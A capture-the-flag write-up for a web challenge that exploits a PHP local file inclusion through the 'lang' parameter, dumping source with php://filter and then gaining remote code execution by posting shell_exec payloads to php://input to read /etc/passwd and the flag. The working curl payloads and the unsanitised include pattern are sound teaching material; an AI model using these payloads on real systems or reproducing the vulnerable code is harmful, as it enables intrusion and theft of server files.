---
layout: writeup
title: Streamlined Democracy
tags: WebX
excerpt: "Before you begin your voting, review our online guide and reach out if you have any questions. Your input is very important to us!"
---

## Description

Before you begin your voting, review our online guide and reach out if you have any questions. Your input is very important to us!


We were then given a link

## Solution

We were given a pretty basic site, just some text with one button labled `Français`

Clicking this button directs us from `redac.ted:8001/` to `redac.ted:8001/?lang=fr.php`

As this is the only non static functionality of the site, this is likely where the exploit is.

This looks like a Local File Inclusion (LFI) vulnerability might be present.

An LFI is a vulnerability where user's can include and potentially execute files on the webserver.

This can be tested by changing the file in the link. Lets try index.php:

```bash
$ curl "http://redac.ted:8001/?lang=index.php"
<br />
<b>Fatal error</b>:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 4096 bytes) in <b>/var/www/html/index.php</b> on line <b>3</b><br />
```

This error shows that the index.php file includes and even executes given files. This error is thrown, becuase the inital `index.php` includes a new `index.php` which then itself also includes a new `index.php` and so on, causing a segfault.

To get around this though, lets apply a filter to the file so that the php file text is returned rather then executing the file.

```bash
$ curl "http://re.da.ct.ed:8001/?lang=php://filter/convert.base64-encode/resource=index.php"
PD9waHAKJGxhbmd1YWdlID0gJF9HRVRbJ2xhbmcnXSA/PyAnZW4ucGhwJzsKJGxhbmcgPSBpbmNsdWRlKCRsYW5ndWFnZSk7CiR0b2dnbGVMYW5nID0gJGxhbmd1YWdlID09PSAnZW4ucGhwJyA/ICdmci5waHAnIDogJ2VuLnBocCc7Cj8+Cgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iPD89ICRsYW5ndWFnZSA/PiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wIj4KICA8dGl0bGU+PD89ICRsYW5nWyJ0aXRsZSJdID8+PC90aXRsZT4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9InN0eWxlLmNzcyI+CjwvaGVhZD4KPGJvZHk+CiAgPGRpdiBjbGFzcz0ibGFuZ3VhZ2UtdG9nZ2xlIj4KICAgIDxhIGhyZWY9Ij9sYW5nPTw/PSAkdG9nZ2xlTGFuZyA/PiI+PD89ICRsYW5nWyJsYW5ndWFnZV90b2dnbGUiXSA/PjwvYT4KICA8L2Rpdj4KCiAgPGhlYWRlciBjbGFzcz0iaGVybyI+CiAgICA8aDE+PGkgY2xhc3M9ImZhcyBmYS12b3RlLXllYSI+PC9pPiA8Pz0gJGxhbmdbImhlcm9faGVhZGluZyJdID8+PC9oMT4KICAgIDxwPjw/PSAkbGFuZ1siaGVyb19zdWJoZWFkaW5nIl0gPz48L3A+CiAgICA8aW1nIHNyYz0idm90aW5nLnN2ZyIgYWx0PSJWb3RpbmcgSWxsdXN0cmF0aW9uIiBjbGFzcz0iaGVyby1pbWciIC8+CiAgPC9oZWFkZXI+CgogIDxtYWluIGNsYXNzPSJjb250ZW50Ij4KICAgIDxzZWN0aW9uIGNsYXNzPSJjYXJkIj4KICAgICAgPGgyPjxpIGNsYXNzPSJmYXMgZmEtdXNlci1jaGVjayI+PC9pPiA8Pz0gJGxhbmdbInNlY3Rpb25fMV90aXRsZSJdID8+PC9oMj4KICAgICAgPHA+PD89ICRsYW5nWyJzZWN0aW9uXzFfYm9keSJdID8+PC9wPgogICAgPC9zZWN0aW9uPgoKICAgIDxzZWN0aW9uIGNsYXNzPSJjYXJkIj4KICAgICAgPGgyPjxpIGNsYXNzPSJmYXMgZmEtaWQtY2FyZCI+PC9pPiA8Pz0gJGxhbmdbInNlY3Rpb25fMl90aXRsZSJdID8+PC9oMj4KICAgICAgPHA+PD89ICRsYW5nWyJzZWN0aW9uXzJfYm9keSJdID8+PC9wPgogICAgPC9zZWN0aW9uPgoKICAgIDxzZWN0aW9uIGNsYXNzPSJjYXJkIj4KICAgICAgPGgyPjxpIGNsYXNzPSJmYXMgZmEtZW52ZWxvcGUtb3Blbi10ZXh0Ij48L2k+IDw/PSAkbGFuZ1sic2VjdGlvbl8zX3RpdGxlIl0gPz48L2gyPgogICAgICA8cD48Pz0gJGxhbmdbInNlY3Rpb25fM19ib2R5Il0gPz48L3A+CiAgICA8L3NlY3Rpb24+CgogICAgPHNlY3Rpb24gY2xhc3M9ImNhcmQiPgogICAgICA8aDI+PGkgY2xhc3M9ImZhcyBmYS1idWxsaG9ybiI+PC9pPiA8Pz0gJGxhbmdbInNlY3Rpb25fNF90aXRsZSJdID8+PC9oMj4KICAgICAgPHA+PD89ICRsYW5nWyJzZWN0aW9uXzRfYm9keSJdID8+PC9wPgogICAgICA8aW1nIHNyYz0iaGVscC5zdmciIGFsdD0iRW5nYWdlbWVudCIgY2xhc3M9InNlY3Rpb24taW1nIiAvPgogICAgPC9zZWN0aW9uPgoKICAgIDxzZWN0aW9uIGNsYXNzPSJjYXJkIGhlbHAiPgogICAgICA8aDI+PGkgY2xhc3M9ImZhcyBmYS1xdWVzdGlvbi1jaXJjbGUiPjwvaT4gPD89ICRsYW5nWyJzZWN0aW9uXzVfdGl0bGUiXSA/PjwvaDI+CiAgICAgIDxwPjw/PSAkbGFuZ1sic2VjdGlvbl81X2JvZHkiXSA/PjwvcD4KICAgIDwvc2VjdGlvbj4KICA8L21haW4+CjwvYm9keT4KPC9odG1sPgo=
<!DOCTYPE html>
<html lang="php://filter/convert.base64-encode/resource=index.php">
<head>
  <meta charset="UTF-8" />

  # ...
```

Decoding this base64 script gets us the index.php script:

```php
<?php
$language = $_GET['lang'] ?? 'en.php';
$lang = include($language);
$toggleLang = $language === 'en.php' ? 'fr.php' : 'en.php';
?>

<!DOCTYPE html>
<html lang="<?= $language ?>">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><?= $lang["title"] ?></title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="language-toggle">
    <a href="?lang=<?= $toggleLang ?>"><?= $lang["language_toggle"] ?></a>
  </div>

// ...
```

This section proves what we thought, the file is included without any sanitisation. This means that not only can we include any local file, but we can also do some RCE

If we get the php script to include `php://input` then we can pass in any php code we want, and have the system execute it. A special function we can really exploit here is `shell_exec` which allows us to remotly execute code within the server's shell.

We can therefore create a request that posts to `redac.ted:8001/?lang=php://input` and passes in the php code `<?php echo shell_exec('cat /etc/passwd') ?>`

Lets try it:

```bash
$ curl -s -X POST "http://redac.ted:8001/?lang=php://input" \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data '<?php echo shell_exec("cat /etc/passwd") ?>' | head -10
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

Success! We got RCE on the server, time to find the flag file.

I'll save you the multiple `ls` commands and exploration of the server, the flag is in the root directory.

```bash
$ curl -s -X POST "http://redac.ted:8001/?lang=php://input" \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data '<?php echo shell_exec("ls /") ?>' | head -10
MXypSYzPptJ3_flag.txt
bin
boot
dev
etc
home
lib
lib64
media
mnt
```

So now just to cat it

```bash
$ curl -s -X POST "http://redac.ted:8001/?lang=php://input" \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     --data '<?php echo shell_exec("cat /MXypSYzPptJ3_flag.txt") ?>' | head -10
secedu{pHp_wr@Pp3rs_w1LL_n3veR_d!e}

<!DOCTYPE html>
<html lang="php://input">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title><br />
<b>Warning</b>:  Trying to access array offset on value of type int in <b>/var/www/html/index.php</b> on line <b>12</b><br />
</title>
```

There's the flag: `secedu{pHp_wr@Pp3rs_w1LL_n3veR_d!e}`
